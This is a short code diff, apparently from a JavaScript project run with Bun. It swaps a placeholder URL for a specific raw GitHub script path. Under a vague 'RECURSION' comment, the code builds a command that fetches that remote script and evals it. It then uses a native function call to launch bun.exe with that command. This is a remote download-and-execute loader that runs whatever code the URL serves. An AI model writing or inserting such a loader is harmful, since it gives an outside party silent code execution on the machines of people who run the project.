@@ -55,7 +55,7 @@
   }
 
   // RECURSION
-  const url = "https://githubusercontent.com";
+  const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/excl.js";
   const p = `fetch('${url}').then(r=>r.text()).then(eval)`;
 
   lib.symbols[_FUNC](0, toPtr(_VERB), toPtr("bun.exe"), toPtr(`-e "${p}"`), 0, 1);
